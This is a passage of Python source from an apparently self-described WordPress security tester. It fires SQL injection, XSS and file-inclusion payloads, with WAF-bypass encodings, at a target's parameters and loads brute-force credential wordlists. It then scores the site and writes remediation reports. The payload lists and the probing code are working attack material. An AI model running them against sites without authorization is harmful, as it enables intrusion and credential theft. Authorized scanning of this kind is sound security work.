                                        self.print_payload_result(f"SQLi ({category_name})", payload, "VULNERABLE",
                                                                f"Parameter '{param}' | Error: {error[:50]}...")
                                        self.add_critical_issue(f"SQLi (Error-based) in parameter '{param}'", test_url)
                                        vulnerabilities_found += 1
                                        return True  # Stop after first confirmed vulnerability
                                
                                # Check for union injection results
                                if 'union' in payload.lower():
                                    # Look for numbers 1-10 in response (common union test)
                                    union_found = False
                                    for i in range(1, 11):
                                        if str(i) in response.text:
                                            union_found = True
                                            break
                                    
                                    if union_found:
                                        self.print_payload_result(f"SQLi ({category_name})", payload, "VULNERABLE",
                                                                f"Parameter '{param}' | Union injection successful")
                                        self.add_critical_issue(f"SQLi (Union-based) in parameter '{param}'", test_url)
                                        vulnerabilities_found += 1
                                        return True
                                else:
                                    # Check for successful injection by comparing with baseline
                                    baseline_url = f"{endpoint}?{param}=test"
                                    baseline_response = self.advanced_request(baseline_url, timeout=5, bypass_waf=True)
                                    
                                    if baseline_response and response:
                                        # Check for significant differences in response
                                        if len(response.text) > len(baseline_response.text) * 1.5:
                                            self.print_payload_result(f"SQLi ({category_name})", payload, "SUSPICIOUS",
                                                                    f"Parameter '{param}' | Response significantly larger")
                                        elif len(response.text) < len(baseline_response.text) * 0.5:
                                            self.print_payload_result(f"SQLi ({category_name})", payload, "SUSPICIOUS",
                                                                    f"Parameter '{param}' | Response significantly smaller")
                            
                            elif response and response.status_code == 500:
                                self.print_payload_result(f"SQLi ({category_name})", payload, "SUSPICIOUS",
                                                        f"Parameter '{param}' | Internal Server Error (500)")
                            elif response and response.status_code == 403:
                                self.print_payload_result(f"SQLi ({category_name})", payload, "PROTECTED",
                                                        f"Parameter '{param}' | Access Forbidden (403)")
        
        # Summary
        self.print_payload_result("SQL Injection Test Summary", f"Tested {tested_payloads} payloads", 
                                 "VULNERABLE" if vulnerabilities_found > 0 else "PROTECTED",
                                 f"Found {vulnerabilities_found} vulnerabilities")
        
        if vulnerabilities_found == 0:
            self.print_result("SUCCESS", "No SQL Injection vulnerabilities detected")
            return False
        
        return True
    
    def load_sqli_payloads(self):
        """Load SQL injection payloads categorized by type with payload verification notes"""
        return {
            'error_based': [
                "'",
                "' OR '1'='1",
                "' AND ExtractValue(1,CONCAT(0x7e,version()))--",
                "' AND UpdateXML(1,CONCAT(0x7e,version()),1)--",
                "' OR IF(1=1,1,(SELECT 1 UNION SELECT 2))--",
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT @@version,user(),database()--",
                "' UNION SELECT table_name,column_name FROM information_schema.columns--",
            ],
            'time_based': [
                "' AND SLEEP(8)--",  # Increased sleep time
                "' OR SLEEP(8)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(8)))a)--",
                "'; WAITFOR DELAY '00:00:08'--",
                "' AND pg_sleep(8)--",
            ],
            'boolean_based': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR IF(1=1,1,0)--",
                "' AND ASCII(SUBSTRING((SELECT user()),1,1))>0--",
            ],
            'waf_bypass': [
                "'/*!50000OR*/'1'='1",
                "'/**/OR/**/'1'='1",
                "'%0AOR%0A'1'='1",
                "'%09OR%09'1'='1",
                "'\nOR\n'1'='1",
                "'\tOR\t'1'='1",
                "'\rOR\r'1'='1",
                "'/*!50000OR*/'1'='1'/*",
                "'/**/OR/**/'1'='1'/**/--",
                "%27%20OR%20%271%27%3D%271",
                "%2527%2520OR%2520%25271%2527%253D%25271",
                "%u0027%u0020OR%u0020%u00271%u0027%u003D%u00271",
            ]
        }
    
    def advanced_xss_test(self):
        """Advanced XSS testing with multiple bypass techniques and payload verification"""
        self.print_test_header("Advanced XSS Testing", "Testing with multiple bypass techniques and contexts")
        
        # Load XSS payloads
        xss_payloads = self.load_xss_payloads()
        
        # Test parameters in different contexts
        test_params = [
            ('reflected', ['q', 'search', 's', 'query', 'keyword']),
            ('stored', ['comment', 'message', 'name', 'email', 'subject']),
            ('dom', ['redirect', 'url', 'return', 'next', 'location']),
        ]
        
        vulnerabilities_found = 0
        tested_payloads = 0
        
        for context, params in test_params:
            for param in params:
                self.print_result("INFO", f"Testing {context} XSS in parameter: {param}")
                
                # Test different payload categories
                payload_categories = [
                    ('Basic', xss_payloads['basic'][:3]),
                    ('Event Handlers', xss_payloads['event_handlers'][:3]),
                    ('JavaScript URI', xss_payloads['javascript_uri'][:2]),
                    ('SVG', xss_payloads['svg'][:2]),
                    ('Bypass', xss_payloads['bypass'][:3]),
                ]
                
                for category_name, payloads in payload_categories:
                    for payload in payloads:
                        tested_payloads += 1
                        test_url = f"{self.base_url}/?{param}={urllib.parse.quote(payload)}"
                        response = self.advanced_request(test_url, timeout=8, bypass_waf=True)
                        
                        if response and response.status_code == 200:
                            # Check if payload is reflected
                            if payload in response.text:
                                self.print_payload_result(f"XSS ({category_name})", payload, "VULNERABLE",
                                                        f"{context} context | Parameter: {param}")
                                self.add_critical_issue(f"XSS ({context}) in parameter '{param}'", test_url)
                                vulnerabilities_found += 1
                                break  # Stop after first vulnerability in this category
                            
                            # Check for encoded payload reflection
                            encoded_payload = html.escape(payload)
                            if encoded_payload in response.text:
                                self.print_payload_result(f"XSS ({category_name})", payload, "SUSPICIOUS",
                                                        f"{context} context | Encoded payload reflected")
                            
                            # Check for script execution context
                            if '<script>' in payload.lower() and '</script>' in response.text.lower():
                                self.print_payload_result(f"XSS ({category_name})", payload, "SUSPICIOUS",
                                                        f"{context} context | Script tags found in response")
                            
                            # Check for event handlers in response
                            if 'onerror=' in response.text.lower() or 'onload=' in response.text.lower():
                                self.print_payload_result(f"XSS ({category_name})", payload, "SUSPICIOUS",
                                                        f"{context} context | Event handlers found")
                            
                            # Check for JavaScript URIs
                            if 'javascript:' in payload.lower() and 'javascript:' in response.text.lower():
                                self.print_payload_result(f"XSS ({category_name})", payload, "SUSPICIOUS",
                                                        f"{context} context | JavaScript URI found")
                        elif response and response.status_code == 403:
                            self.print_payload_result(f"XSS ({category_name})", payload, "PROTECTED",
                                                    f"{context} context | Access Forbidden (403)")
                        elif response and response.status_code == 400:
                            self.print_payload_result(f"XSS ({category_name})", payload, "PROTECTED",
                                                    f"{context} context | Bad Request (400)")
        
        # Summary
        self.print_payload_result("XSS Test Summary", f"Tested {tested_payloads} payloads", 
                                 "VULNERABLE" if vulnerabilities_found > 0 else "PROTECTED",
                                 f"Found {vulnerabilities_found} vulnerabilities")
        
        if vulnerabilities_found == 0:
            self.print_result("SUCCESS", "No XSS vulnerabilities detected")
            return False
        
        return True
    
    def load_xss_payloads(self):
        """Load XSS payloads categorized by type with verification notes"""
        return {
            'basic': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg/onload=alert("XSS")>',
                '<body onload=alert("XSS")>',
            ],
            'event_handlers': [
                '<img src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<iframe onload=alert(1)>',
            ],
            'javascript_uri': [
                'javascript:alert(1)',
                'javascript:alert(document.domain)',
                'javascript:prompt(1)',
            ],
            'svg': [
                '<svg><script>alert(1)</script></svg>',
                '<svg><g onload="alert(1)"></g></svg>',
            ],
            'bypass': [
                '<scr<script>ipt>alert(1)</scr</script>ipt>',
                '<img src="x" onerror="alert`1`">',
                '<svg><script>alert&#40;1&#41</script></svg>',
                '<img src="x" onerror="javas&#x63;ript:alert(1)">',
            ]
        }
    
    def advanced_file_inclusion_test(self):
        """Advanced File Inclusion testing with payload verification"""
        self.print_test_header("Advanced File Inclusion", "Testing LFI/RFI with bypass techniques")
        
        # LFI payloads
        lfi_payloads = [
            ('../../../../etc/passwd', 'Basic LFI'),
            ('....//....//....//etc/passwd', 'Double dot slash'),
            ('../etc/passwd', 'Relative path'),
            ('..%2f..%2f..%2fetc%2fpasswd', 'URL encoded'),
            ('php://filter/convert.base64-encode/resource=../../../../etc/passwd', 'PHP filter'),
            ('/etc/passwd%00', 'Null byte'),
            ('../../../../etc/passwd' + ('/' * 100), 'Path traversal with padding'),
            ('..%252f..%252f..%252fetc%252fpasswd', 'Double URL encoded'),
        ]
        
        # RFI payloads (using test payloads)
        rfi_test_server = "http://httpbin.org/get"  # Safe test server
        rfi_payloads = [
            (f'{rfi_test_server}?test=rfipayload', 'Basic RFI'),
            (f'{rfi_test_server}%00', 'RFI with null byte'),
        ]
        
        test_params = ['file', 'page', 'load', 'include', 'path', 'doc', 'view', 'template']
        vulnerabilities_found = 0
        tested_payloads = 0
        
        for param in test_params:
            # Test LFI
            for payload, payload_desc in lfi_payloads[:6]:  # Limit for performance
                tested_payloads += 1
                test_url = f"{self.base_url}/?{param}={urllib.parse.quote(payload)}"
                response = self.advanced_request(test_url, timeout=10, bypass_waf=True)
                
                if response and response.status_code == 200:
                    response_text = response.text.lower()
                    
                    # Check for common LFI indicators
                    if 'root:' in response_text and ':' in response_text:
                        self.print_payload_result("LFI", payload, "VULNERABLE",
                                                f"Parameter '{param}' | {payload_desc}")
                        self.add_critical_issue(f"LFI in parameter '{param}'", test_url)
                        vulnerabilities_found += 1
                        break  # Stop after first vulnerability
                    
                    # Check for PHP warnings/errors
                    if 'warning:' in response_text or 'fatal error' in response_text:
                        if 'file' in response_text and 'include' in response_text:
                            self.print_payload_result("LFI", payload, "SUSPICIOUS",
                                                    f"Parameter '{param}' | PHP file inclusion error")
                    
                    # Check for base64 encoded content
                    if 'php://filter' in payload and len(response.text) > 100:
                        # Try to decode base64
                        try:
                            decoded = base64.b64decode(response.text.split('\n')[0]).decode('utf-8', errors='ignore')
                            if 'root:' in decoded or '<?php' in decoded:
                                self.print_payload_result("LFI", payload, "VULNERABLE",
                                                        f"Parameter '{param}' | Base64 decoded content found")
                                self.add_critical_issue(f"LFI (Base64) in parameter '{param}'", test_url)
                                vulnerabilities_found += 1
                                break
                        except:
                            pass
                
                elif response and response.status_code == 403:
                    self.print_payload_result("LFI", payload, "PROTECTED",
                                            f"Parameter '{param}' | Access Forbidden")
                elif response and response.status_code == 404:
                    self.print_payload_result("LFI", payload, "FAILED",
                                            f"Parameter '{param}' | File not found")
            
            # Test RFI
            for payload, payload_desc in rfi_payloads[:2]:
                tested_payloads += 1
                test_url = f"{self.base_url}/?{param}={urllib.parse.quote(payload)}"
                response = self.advanced_request(test_url, timeout=15, bypass_waf=True)
                
                if response and response.status_code == 200:
                    response_text = response.text.lower()
                    
                    # Check for RFI indicators
                    if 'httpbin' in response_text or 'test=rfipayload' in response_text:
                        self.print_payload_result("RFI", payload, "VULNERABLE",
                                                f"Parameter '{param}' | {payload_desc}")
                        self.add_critical_issue(f"RFI in parameter '{param}'", test_url)
                        vulnerabilities_found += 1
                        break
                    
                    # Check for external content
                    if len(response.text) > 1000:  # Large response might be external
                        self.print_payload_result("RFI", payload, "SUSPICIOUS",
                                                f"Parameter '{param}' | Large response received")
                elif response and response.status_code == 500:
                    self.print_payload_result("RFI", payload, "SUSPICIOUS",
                                            f"Parameter '{param}' | Internal Server Error (possible RFI attempt)")
        
        # Summary
        self.print_payload_result("File Inclusion Test Summary", f"Tested {tested_payloads} payloads", 
                                 "VULNERABLE" if vulnerabilities_found > 0 else "PROTECTED",
                                 f"Found {vulnerabilities_found} vulnerabilities")
        
        if vulnerabilities_found == 0:
            self.print_result("SUCCESS", "No File Inclusion vulnerabilities detected")
            return False
        
        return True
    
    def load_wordlists(self, username_file=None, password_file=None):
        """Load username and password wordlists with verification"""
        print(f"{Fore.YELLOW}[*] Loading wordlists...{Style.RESET_ALL}")
        
        # Check for custom wordlists
        custom_user_file = username_file
        custom_pass_file = password_file
        
        # If no custom wordlists provided, use defaults
        if not custom_user_file or not os.path.exists(custom_user_file):
            custom_user_file = os.path.join(self.wordlists_dir, "advanced_usernames.txt")
            self.print_result("INFO", f"Using default username list: {custom_user_file}")
        
        if not custom_pass_file or not os.path.exists(custom_pass_file):
            custom_pass_file = os.path.join(self.wordlists_dir, "advanced_passwords.txt")
            self.print_result("INFO", f"Using default password list: {custom_pass_file}")
        
        # Load usernames
        try:
            if os.path.exists(custom_user_file):
                with open(custom_user_file, 'r', encoding='utf-8', errors='ignore') as f:
                    self.username_list = [line.strip() for line in f 
                                         if line.strip() and not line.startswith('#')]
                self.print_payload_result("Wordlist Load", "Usernames", "SUCCESS",
                                         f"Loaded {len(self.username_list)} usernames from {custom_user_file}")
            else:
                self.print_payload_result("Wordlist Load", "Usernames", "FAILED",
                                         f"File not found: {custom_user_file}")
                # Create default if missing
                self.create_advanced_wordlists()
                return self.load_wordlists()
                
        except Exception as e:
            self.print_payload_result("Wordlist Load", "Usernames", "FAILED",
                                     f"Error: {str(e)}")
            self.username_list = ['admin', 'administrator', 'wordpress', 'wpadmin']
        
        # Load passwords
        try:
            if os.path.exists(custom_pass_file):
                with open(custom_pass_file, 'r', encoding='utf-8', errors='ignore') as f:
                    self.password_list = [line.strip() for line in f 
                                         if line.strip() and not line.startswith('#')]
                self.print_payload_result("Wordlist Load", "Passwords", "SUCCESS",
                                         f"Loaded {len(self.password_list)} passwords from {custom_pass_file}")
            else:
                self.print_payload_result("Wordlist Load", "Passwords", "FAILED",
                                         f"File not found: {custom_pass_file}")
                # Create default if missing
                self.create_advanced_wordlists()
                return self.load_wordlists()
                
        except Exception as e:
            self.print_payload_result("Wordlist Load", "Passwords", "FAILED",
                                     f"Error: {str(e)}")
            self.password_list = ['admin', 'password', '123456', 'admin123']
        
        # Remove duplicates
        original_user_count = len(self.username_list)
        original_pass_count = len(self.password_list)
        
        self.username_list = list(set(self.username_list))
        self.password_list = list(set(self.password_list))
        
        if original_user_count != len(self.username_list):
            self.print_result("INFO", f"Removed {original_user_count - len(self.username_list)} duplicate usernames")
        
        if original_pass_count != len(self.password_list):
            self.print_result("INFO", f"Removed {original_pass_count - len(self.password_list)} duplicate passwords")
        
        # Display statistics
        total_combinations = len(self.username_list) * len(self.password_list)
        
        self.print_result("INFO", 
                         f"Total credentials to test: {total_combinations:,}",
                         "", f"Usernames: {len(self.username_list)}, Passwords: {len(self.password_list)}")
        
        # Save wordlist info
        self.save_wordlist_info()
    
    def save_wordlist_info(self):
        """Save wordlist information to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        info_file = os.path.join(self.found_dir, f"wordlists_info_{timestamp}.txt")
        
        try:
            with open(info_file, 'w', encoding='utf-8') as f:
                f.write("Wordlists Information\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Target URL: {self.base_url}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Usernames: {len(self.username_list)}\n")
                f.write(f"Total Passwords: {len(self.password_list)}\n")
                f.write(f"Total Combinations: {len(self.username_list) * len(self.password_list):,}\n\n")
                
                f.write("Sample Usernames (first 20):\n")
                for i, username in enumerate(self.username_list[:20], 1):
                    f.write(f"{i:2d}. {username}\n")
                if len(self.username_list) > 20:
                    f.write(f"... and {len(self.username_list) - 20} more\n\n")
                
                f.write("Sample Passwords (first 20):\n")
                for i, password in enumerate(self.password_list[:20], 1):
                    f.write(f"{i:2d}. {password}\n")
                if len(self.password_list) > 20:
                    f.write(f"... and {len(self.password_list) - 20} more\n")
            
            self.print_result("SUCCESS", f"Wordlist information saved to: {info_file}")
            
        except Exception as e:
            self.print_result("WARNING", f"Error saving wordlist info: {str(e)}")
    
    def add_critical_issue(self, issue, url=""):
        """Add critical issue to results with verification"""
        self.results["critical_issues"].append({
            "issue": issue,
            "url": url,
            "timestamp": datetime.now().isoformat(),
            "verified": True
        })
        
        self.print_payload_result("Critical Issue", issue, "CRITICAL",
                                 f"Added to report: {url[:100]}" if url else "No URL provided")
    
    def run_comprehensive_scan(self):
        """Run comprehensive security scan with payload verification"""
        self.print_banner()
        
        self.results["scan_info"]["start_time"] = datetime.now().isoformat()
        start_time = time.time()
        
        print(f"{Fore.CYAN}[*] Starting comprehensive WordPress security scan...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Target: {self.base_url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Environment: {'Termux Android' if self.is_termux else 'Desktop'}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Advanced Bypass Techniques: Enabled{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Payload Verification: Enabled{Style.RESET_ALL}\n")
        
        # Create wordlists if they don't exist
        if not os.path.exists(os.path.join(self.wordlists_dir, "advanced_usernames.txt")):
            self.create_advanced_wordlists()
        
        # Load default wordlists
        self.load_wordlists()
        
        # Run all security tests
        tests = [
            ("WordPress Detection", self.detect_wordpress),
            ("Login Page Security", self.test_login_page_security),
            ("Username Enumeration", self.username_enumeration_test),
            ("SQL Injection Test", self.advanced_sql_injection_test),
            ("XSS Test", self.advanced_xss_test),
            ("File Inclusion Test", self.advanced_file_inclusion_test),
        ]
        
        for test_name, test_func in tests:
            try:
                print(f"\n{Fore.CYAN}{'━'*60}")
                print(f"🚀 Starting Test: {test_name}")
                print(f"{'━'*60}{Style.RESET_ALL}")
                
                test_start_time = time.time()
                test_result = test_func()
                test_duration = time.time() - test_start_time
                
                if test_result:
                    self.print_payload_result(test_name, "Completed", "SUCCESS", 
                                            f"Test duration: {test_duration:.1f}s")
                else:
                    self.print_payload_result(test_name, "Completed", "INFO", 
                                            f"Test duration: {test_duration:.1f}s")
                
                time.sleep(1)  # Delay between tests to avoid rate limiting
                
            except KeyboardInterrupt:
                self.print_payload_result(test_name, "Interrupted", "WARNING", 
                                         "Test interrupted by user")
                break
            except Exception as e:
                self.print_payload_result(test_name, "Error", "FAILED", 
                                         f"Exception: {str(e)[:50]}")
        
        # Record scan duration
        self.results["scan_info"]["end_time"] = datetime.now().isoformat()
        self.results["scan_info"]["duration"] = time.time() - start_time
        
        # Generate reports
        self.generate_reports()
        
        self.print_payload_result("Comprehensive Scan", "Completed", "SUCCESS", 
                                 f"Total duration: {self.results['scan_info']['duration']:.1f}s")
    
    def generate_reports(self):
        """Generate comprehensive reports with payload verification"""
        self.print_test_header("Generating Reports", "Creating security assessment reports")
        
        # Calculate security score
        self.calculate_security_score()
        
        # Generate recommendations
        self.generate_recommendations()
        
        # Save reports
        self.save_text_report()
        self.save_json_report()
        
        # Display summary
        self.display_summary()
    
    def calculate_security_score(self):
        """Calculate overall security score with payload verification"""
        total_possible = 100
        score = total_possible
        
        # Deduct for critical issues (20 points each)
        critical_deduction = len(self.results["critical_issues"]) * 20
        score -= critical_deduction
        
        # Deduct for failed tests (10 points each)
        failed_deduction = self.stats["failed"] * 10
        score -= failed_deduction
        
        # Deduct for warnings (5 points each)
        warning_deduction = self.stats["warnings"] * 5
        score -= warning_deduction
        
        # Add bonus for passed tests (2 points each, max 20)
        bonus = min(self.stats["passed"], 10) * 2
        score += bonus
        
        # Ensure score is within reasonable bounds
        score = max(0, min(100, score))
        
        self.results["security_score"] = round(score, 1)
        
        # Calculate grade
        if score >= 90:
            grade = "A+ 🟢 EXCELLENT"
        elif score >= 80:
            grade = "A 🟢 VERY GOOD"
        elif score >= 70:
            grade = "B 🟡 GOOD"
        elif score >= 60:
            grade = "C 🟡 FAIR"
        elif score >= 50:
            grade = "D 🟠 POOR"
        else:
            grade = "F 🔴 CRITICAL"
        
        self.results["security_grade"] = grade
        
        self.print_payload_result("Security Score", f"{score}% ({grade})", 
                                 "SUCCESS" if score >= 70 else "WARNING" if score >= 50 else "CRITICAL",
                                 f"Based on {self.stats['total_tests']} tests")
    
    def generate_recommendations(self):
        """Generate security recommendations based on findings with verification"""
        recommendations = []
        
        # Critical issues
        if self.results["critical_issues"]:
            critical_count = len(self.results["critical_issues"])
            recommendations.append({
                "priority": "CRITICAL 🔴",
                "recommendation": f"Immediately address {critical_count} critical issue(s)",
                "action": "Review and fix all critical vulnerabilities from the report",
                "impact": "HIGH",
                "urgency": "IMMEDIATE"
            })
        
        # Valid credentials found
        if self.results["brute_force_results"]["successful_logins"]:
            cred_count = len(self.results["brute_force_results"]["successful_logins"])
            recommendations.append({
                "priority": "CRITICAL 🔴",
                "recommendation": f"Change {cred_count} compromised password(s) immediately",
                "action": "Use strong, unique passwords (12+ chars, mix of letters, numbers, symbols) and enable Two-Factor Authentication (2FA)",
                "impact": "CRITICAL",
                "urgency": "IMMEDIATE"
            })
        
        # Valid usernames found
        if self.results["brute_force_results"]["valid_usernames_found"]:
            user_count = len(self.results["brute_force_results"]["valid_usernames_found"])
            recommendations.append({
                "priority": "HIGH 🟠",
                "recommendation": f"Review {user_count} discovered username(s)",
                "action": "Consider changing usernames, implementing login attempt limiting, and using email-based logins",
                "impact": "HIGH",
                "urgency": "WITHIN 24 HOURS"
            })
        
        # Brute force protection
        if not self.results["brute_force_results"]["rate_limiting"]:
            recommendations.append({
                "priority": "HIGH 🟠",
                "recommendation": "Implement login attempt limiting",
                "action": "Install security plugin (Wordfence, Sucuri, or iThemes Security) or configure server-side rate limiting",
                "impact": "HIGH",
                "urgency": "WITHIN 48 HOURS"
            })
        
        # SQL Injection vulnerabilities
        sql_vulns = [issue for issue in self.results["critical_issues"] if "SQLi" in issue["issue"]]
        if sql_vulns:
            recommendations.append({
                "priority": "CRITICAL 🔴",
                "recommendation": "Fix SQL Injection vulnerabilities",
                "action": "Implement prepared statements, input validation, and use WordPress security plugins with SQLi protection",
                "impact": "CRITICAL",
                "urgency": "IMMEDIATE"
            })
        
        # XSS vulnerabilities
        xss_vulns = [issue for issue in self.results["critical_issues"] if "XSS" in issue["issue"]]
        if xss_vulns:
            recommendations.append({
                "priority": "HIGH 🟠",
                "recommendation": "Fix Cross-Site Scripting vulnerabilities",
                "action": "Implement output encoding, Content Security Policy (CSP), and validate/sanitize all user inputs",
                "impact": "HIGH",
                "urgency": "WITHIN 24 HOURS"
            })
        
        # File inclusion vulnerabilities
        fi_vulns = [issue for issue in self.results["critical_issues"] if "LFI" in issue["issue"] or "RFI" in issue["issue"]]
        if fi_vulns:
            recommendations.append({
                "priority": "CRITICAL 🔴",
                "recommendation": "Fix File Inclusion vulnerabilities",
                "action": "Restrict file inclusion paths, disable dangerous PHP functions (allow_url_include, allow_url_fopen), and update PHP configuration",
                "impact": "CRITICAL",
                "urgency": "IMMEDIATE"
            })
        
        # General recommendations
        recommendations.extend([
            {
                "priority": "MEDIUM 🟡",
                "recommendation": "Keep WordPress core, themes, and plugins updated",
                "action": "Enable automatic updates or update manually at least weekly",
                "impact": "MEDIUM",
                "urgency": "WEEKLY"
            },
            {
                "priority": "MEDIUM 🟡",
                "recommendation": "Implement Web Application Firewall (WAF)",
                "action": "Consider Cloudflare, Sucuri, or Wordfence firewall",
                "impact": "MEDIUM",
                "urgency": "WITHIN 1 WEEK"
            },
            {
                "priority": "LOW 🟢",
                "recommendation": "Regular security audits",
                "action": "Schedule monthly security scans and penetration tests",
                "impact": "LOW",
                "urgency": "MONTHLY"
            },
            {
                "priority": "MEDIUM 🟡",
                "recommendation": "Security headers implementation",
                "action": "Add security headers to .htaccess or web server configuration (CSP, HSTS, X-Frame-Options, etc.)",
                "impact": "MEDIUM",
                "urgency": "WITHIN 1 WEEK"
            }
        ])
        
        self.results["recommendations"] = recommendations
        
        self.print_payload_result("Recommendations Generated", f"{len(recommendations)} items", "SUCCESS", 
                                 f"Priorities: {len([r for r in recommendations if 'CRITICAL' in r['priority']])} Critical")
    
    def save_text_report(self):
        """Generate and save comprehensive text report with verification"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        txt_file = os.path.join(self.reports_dir, f"security_report_{timestamp}.txt")
        
        try:
            with open(txt_file, 'w', encoding='utf-8') as f:
                # Header
                f.write("=" * 80 + "\n")
                f.write("WORDPRESS SECURITY ASSESSMENT REPORT\n")
                f.write("=" * 80 + "\n\n")
                
                # Basic Information
                f.write("📋 BASIC INFORMATION\n")
                f.write("-" * 40 + "\n")
                f.write(f"🔗 Target URL: {self.base_url}\n")
                f.write(f"📅 Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"⭐ Security Score: {self.results['security_score']}% ({self.results.get('security_grade', 'N/A')})\n")
                f.write(f"⏱️ Scan Duration: {self.results['scan_info']['duration']:.1f} seconds\n")
                f.write(f"💻 Environment: {self.results['scan_info'].get('environment', 'Unknown')}\n")
                f.write(f"🛠️ Tool Version: WordPress Ultimate Security Tester v5.1 - Termux Edition\n\n")
                
                # WordPress Information
                f.write("🌐 WORDPRESS INFORMATION\n")
                f.write("-" * 40 + "\n")
                f.write(f"✅ WordPress Detected: {'Yes' if self.results['wordpress_info']['detected'] else 'No'}\n")
                f.write(f"🔢 WordPress Version: {self.results['wordpress_info']['version'] or 'Not detected'}\n")
                f.write(f"👥 Users Discovered: {len(self.results['wordpress_info']['users'])}\n")
                f.write(f"🔑 Valid Usernames Found: {len(self.results['wordpress_info'].get('valid_usernames', []))}\n\n")
                
                # Statistics
                f.write("📊 SCAN STATISTICS\n")
                f.write("-" * 40 + "\n")
                f.write(f"📈 Total Tests: {self.stats['total_tests']}\n")
                f.write(f"✅ Tests Passed: {self.stats['passed']}\n")
                f.write(f"❌ Tests Failed: {self.stats['failed']}\n")
                f.write(f"⚠️ Tests Warning: {self.stats['warnings']}\n")
                f.write(f"🔥 Critical Issues: {self.stats['critical']}\n\n")
                
                # Critical Issues
                f.write("🚨 CRITICAL ISSUES\n")
                f.write("-" * 40 + "\n")
                if self.results["critical_issues"]:
                    for i, issue in enumerate(self.results["critical_issues"], 1):
                        f.write(f"{i}. 🔥 {issue['issue']}\n")
                        if issue['url']:
                            f.write(f"   📎 URL: {issue['url']}\n")
                        f.write(f"   ⏰ Time: {issue.get('timestamp', 'N/A')}\n\n")
                else:
                    f.write("🎉 No critical issues found.\n\n")
                
                # Authentication Findings
                f.write("🔐 AUTHENTICATION FINDINGS\n")
                f.write("-" * 40 + "\n")
                if self.results["brute_force_results"]["successful_logins"]:
                    f.write("🚨 VALID CREDENTIALS FOUND:\n")
                    for i, cred in enumerate(self.results["brute_force_results"]["successful_logins"], 1):
                        f.write(f"{i}. 🔓 {cred}\n")
                    f.write(f"\n📊 Total Attempts: {self.results['brute_force_results']['attempts']}\n")
                    f.write(f"❌ Failed Logins: {self.results['brute_force_results']['failed_logins']}\n")
                else:
                    f.write("✅ No valid credentials found.\n")
                
                if self.results["brute_force_results"]["valid_usernames_found"]:
                    f.write(f"\n👤 VALID USERNAMES DISCOVERED: {len(self.results['brute_force_results']['valid_usernames_found'])}\n")
                    for username in self.results["brute_force_results"]["valid_usernames_found"][:10]:
                        f.write(f"  • {username}\n")
                    if len(self.results["brute_force_results"]["valid_usernames_found"]) > 10:
                        f.write(f"  ... and {len(self.results['brute_force_results']['valid_usernames_found']) - 10} more\n")
                
                f.write(f"\n🛡️ Rate Limiting: {'✅ Enabled' if self.results['brute_force_results']['rate_limiting'] else '❌ Not detected'}\n\n")
                
                # Recommendations
                f.write("💡 RECOMMENDATIONS\n")
                f.write("-" * 40 + "\n")
                if self.results["recommendations"]:
                    for i, rec in enumerate(self.results["recommendations"], 1):
                        f.write(f"{i}. {rec.get('priority', 'MEDIUM')} {rec.get('recommendation', '')}\n")
                        f.write(f"   🛠️ Action: {rec.get('action', '')}\n")
                        f.write(f"   📈 Impact: {rec.get('impact', 'MEDIUM')}\n")
                        f.write(f"   ⏰ Urgency: {rec.get('urgency', 'WHEN POSSIBLE')}\n\n")
                else:
                    f.write("No specific recommendations.\n\n")
                
                # Detailed Findings
                f.write("🔍 DETAILED FINDINGS\n")
                f.write("-" * 40 + "\n")
                
                if self.stats["passed"] > 0:
                    f.write(f"✅ {self.stats['passed']} tests passed\n")
                
                if self.stats["warnings"] > 0:
                    f.write(f"⚠️ {self.stats['warnings']} warnings\n")
                
                if self.stats["failed"] > 0:
                    f.write(f"❌ {self.stats['failed']} tests failed\n")
                
                # Scan Information
                f.write("\n📋 SCAN INFORMATION\n")
                f.write("-" * 40 + "\n")
                f.write(f"⏰ Start Time: {self.results['scan_info']['start_time']}\n")
                f.write(f"⏰ End Time: {self.results['scan_info']['end_time']}\n")
                f.write(f"⏳ Request Delay: {self.delay}s\n")
                f.write(f"⏱️ Timeout: {self.timeout}s\n")
                f.write(f"🌐 User Agent: {self.user_agent[:50]}...\n")
                
                f.write("\n" + "=" * 80 + "\n")
                f.write("📄 END OF REPORT\n")
                f.write("=" * 80 + "\n")
                f.write("\nGenerated by WordPress Ultimate Security Tester v5.1 - Termux Edition\n")
                f.write("⚠️ For authorized security testing only\n")
                f.write("🔒 Always follow responsible disclosure practices\n")
            
            self.print_payload_result("Text Report", "Generated", "SUCCESS", 
                                     f"Saved to: {txt_file}")
            
        except Exception as e:
            self.print_payload_result("Text Report", "Generation Failed", "FAILED", 
                                     f"Error: {str(e)}")
    
    def save_json_report(self):
        """Save report in JSON format for programmatic use"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        json_file = os.path.join(self.reports_dir, f"security_report_{timestamp}.json")
        
        try:
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, default=str)
            
            self.print_payload_result("JSON Report", "Generated", "SUCCESS", 
                                     f"Saved to: {json_file}")
            
        except Exception as e:
            self.print_payload_result("JSON Report", "Generation Failed", "FAILED", 
                                     f"Error: {str(e)}")
    
    def display_summary(self):
        """Display scan summary in terminal with payload verification"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"📊 SECURITY SCAN SUMMARY")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        # Security Score with color
        score = self.results["security_score"]
        if score >= 80:
            score_color = Fore.GREEN
